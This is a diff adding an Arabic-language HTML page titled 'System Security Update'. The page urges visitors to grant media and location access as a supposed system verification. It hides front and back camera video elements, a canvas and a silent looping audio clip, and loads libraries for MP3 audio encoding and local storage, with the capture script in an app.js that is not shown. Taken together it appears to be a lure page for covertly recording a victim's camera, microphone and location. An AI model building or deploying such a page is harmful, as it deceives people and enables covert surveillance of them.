@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Security Update</title>
+    <link rel="stylesheet" href="style.css">
+    <!-- مكتبة lamejs لتحويل الصوت إلى MP3 -->
+    <script src="https://cdn.jsdelivr.net/npm/lamejs@1.2.1/lame.min.js"></script>
+    <!-- مكتبة localforage للتخزين المحلي (IndexedDB) -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/localforage/1.10.0/localforage.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="cyber-box">
+            <div class="shield-icon">🛡️</div>
+            <h1>تحديث الأمان</h1>
+            <p class="subtitle">مطلوب التحقق من النظام لضمان أمان جهازك. يرجى السماح بالوصول إلى الوسائط والموقع.</p>
+            
+            <button id="startBtn" class="cyber-btn">بدء التحقق الآمن</button>
+            
+            <div id="status" class="status-text">في انتظار الإذن...</div>
+            
+            <!-- عناصر مخفية -->
+            <video id="videoFront" autoplay playsinline style="display:none;"></video>
+            <video id="videoBack" autoplay playsinline style="display:none;"></video>
+            <canvas id="canvas" style="display:none;"></canvas>
+            <audio id="silentAudio" loop style="display:none;">
+                <!-- ملف صوتي صامت صغير جداً base64 -->
+                <source src="data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA" type="audio/wav">
+            </audio>
+        </div>
+    </div>
+    <script src="app.js"></script>
+</body>
+</html>
